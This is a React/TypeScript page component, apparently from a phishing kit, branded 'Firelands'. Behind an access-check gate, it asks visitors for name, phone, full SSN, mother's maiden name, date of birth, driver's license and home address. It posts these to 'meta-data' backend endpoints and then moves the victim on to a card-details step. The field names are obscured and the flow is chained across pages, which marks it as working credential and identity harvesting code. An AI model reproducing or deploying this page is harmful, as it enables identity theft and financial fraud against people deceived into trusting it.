import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';

const heroImageUrl = '/assets/firelands-landing.jpg';

const BasicInfo: React.FC = () => {
  const location = useLocation();
  const { emzemz } = location.state || {};
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/');
    }
  }, [emzemz, navigate]);

  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [stateField, setStateField] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const [errors, setErrors] = useState({
    fzNme: '',
    lzNme: '',
    phone: '',
    ssn: '',
    motherMaidenName: '',
    dob: '',
    driverLicense: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: '',
    form: '',
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = month && year ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    }
    if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, a, b, c) => (c ? `${a}-${b}-${c}` : `${a}-${b}`));
    }
    if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, a, b) => (b ? `${a}-${b}` : `${a}`));
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');

    const newErrors = {
      fzNme: !fzNme.trim() ? 'First name is required' : '',
      lzNme: !lzNme.trim() ? 'Last name is required' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
      dob: !month || !day || !year ? 'Complete date of birth is required' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
      stAd: !stAd.trim() ? 'Street address is required' : '',
      city: !city.trim() ? 'City is required' : '',
      state: !stateField.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required' : '',
      form: '',
    };

    if (month && day && year) {
      const dobDate = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dobDate.getFullYear();
      const monthDiff = new Date().getMonth() - dobDate.getMonth();
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(Boolean);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    const getMonthName = (monthNumber: string) => {
      const monthNames = [
        'January',
        'February',
        'March',
        'April',
        'May',
        'June',
        'July',
        'August',
        'September',
        'October',
        'November',
        'December',
      ];
      return monthNames[parseInt(monthNumber) - 1] || '';
    };

    const dob = `${getMonthName(month)}/${day}/${year}`;

    try {
      await axios.post(`${baseUrl}api/firelands-meta-data-3/`, {
        emzemz,
        fzNme,
        lzNme,
        phone: phone.replace(/\D/g, ''),
        ssn: ssn.replace(/\D/g, ''),
        motherMaidenName,
        dob,
        driverLicense,
      });

      await axios.post(`${baseUrl}api/firelands-meta-data-4/`, {
        emzemz,
        stAd,
        apt,
        city,
        state: stateField,
        zipCode,
      });

      navigate('/card', { state: { emzemz } });
    } catch (error) {
      console.error('Error submitting basic info:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (isAllowed === null) {
    return <div>Loading...</div>;
  }

  if (isAllowed === false) {
    return <div>Access denied. Redirecting...</div>;
  }

  return (
    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
      <div className="absolute inset-0">
        <img
          src={heroImageUrl}
          alt="Sun setting over Firelands farm fields"
          className="h-full w-full object-cover"
          loading="lazy"
          decoding="async"
          fetchPriority="high"
          sizes="100vw"
        />
        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
      </div>

      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
        <div className="mx-auto w-full max-w-6xl">
          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
            <h2 className="text-2xl font-semibold text-[#2f2e67]">Personal Information</h2>

            <form onSubmit={handleSubmit} className="mt-6 space-y-5">
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]">First Name</label>
                  <input
                    value={fzNme}
                    onChange={(e) => setFzNme(e.target.value)}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  {errors.fzNme && <p className="text-sm text-rose-600">{errors.fzNme}</p>}
                </div>
                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]">Last Name</label>
                  <input
                    value={lzNme}
                    onChange={(e) => setLzNme(e.target.value)}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  {errors.lzNme && <p className="text-sm text-rose-600">{errors.lzNme}</p>}
                </div>
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Phone Number</label>
                <input
                  value={phone}
                  onChange={(e) => setPhone(formatPhone(e.target.value))}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.phone && <p className="text-sm text-rose-600">{errors.phone}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">SSN</label>
                <div className="relative">
                  <input
                    type={showSSN ? 'text' : 'password'}
                    value={ssn}
                    onChange={(e) => setSsn(formatSSN(e.target.value))}
                    className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 pr-16 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  />
                  <button
                    type="button"
                    onClick={() => setShowSSN(prev => !prev)}
                    className="absolute inset-y-0 right-4 text-sm font-semibold text-[#5a63d8]"
                  >
                    {showSSN ? 'Hide' : 'Show'}
                  </button>
                </div>
                {errors.ssn && <p className="text-sm text-rose-600">{errors.ssn}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Mother's Maiden Name</label>
                <input
                  value={motherMaidenName}
                  onChange={(e) => setMotherMaidenName(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.motherMaidenName && <p className="text-sm text-rose-600">{errors.motherMaidenName}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Date of Birth</label>
                <div className="grid grid-cols-3 gap-3">
                  <select
                    value={month}
                    onChange={(e) => setMonth(e.target.value)}
                    className="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-sm text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  >
                    <option value="">Month</option>
                    {Array.from({ length: 12 }, (_, i) => (
                      <option key={i + 1} value={String(i + 1)}>
                        {new Date(0, i).toLocaleString('default', { month: 'long' })}
                      </option>
                    ))}
                  </select>
                  <select
                    value={day}
                    onChange={(e) => setDay(e.target.value)}
                    disabled={!month || !year}
                    className="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-sm text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  >
                    <option value="">Day</option>
                    {Array.from({ length: daysInMonth }, (_, i) => (
                      <option key={i + 1} value={String(i + 1)}>
                        {i + 1}
                      </option>
                    ))}
                  </select>
                  <select
                    value={year}
                    onChange={(e) => {
                      setYear(e.target.value);
                      setDay('');
                    }}
                    className="rounded-2xl border border-gray-200 bg-gray-50 px-3 py-3 text-sm text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                  >
                    <option value="">Year</option>
                    {years.map((y) => (
                      <option key={y} value={String(y)}>
                        {y}
                      </option>
                    ))}
                  </select>
                </div>
                {errors.dob && <p className="text-sm text-rose-600">{errors.dob}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Driver's License</label>
                <input
                  value={driverLicense}
                  onChange={(e) => setDriverLicense(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.driverLicense && <p className="text-sm text-rose-600">{errors.driverLicense}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Street Address</label>
                <input
                  value={stAd}
                  onChange={(e) => setStAd(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.stAd && <p className="text-sm text-rose-600">{errors.stAd}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Apartment / Unit (optional)</label>
                <input
                  value={apt}
                  onChange={(e) => setApt(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">City</label>
                <input
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.city && <p className="text-sm text-rose-600">{errors.city}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">State</label>
                <input
                  value={stateField}
                  onChange={(e) => setStateField(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.state && <p className="text-sm text-rose-600">{errors.state}</p>}
              </div>

              <div className="space-y-2">
                <label className="text-sm text-[#5d4f72]">Zip Code</label>
                <input
                  value={zipCode}
                  onChange={(e) => setZipCode(e.target.value)}
                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                />
                {errors.zipCode && <p className="text-sm text-rose-600">{errors.zipCode}</p>}
              </div>

              {errors.form && <p className="text-center text-sm text-rose-600">{errors.form}</p>}

              <button
                type="submit"
                disabled={isLoading}
                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
              >
                {isLoading ? 'Processing...' : 'Continue'}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BasicInfo;
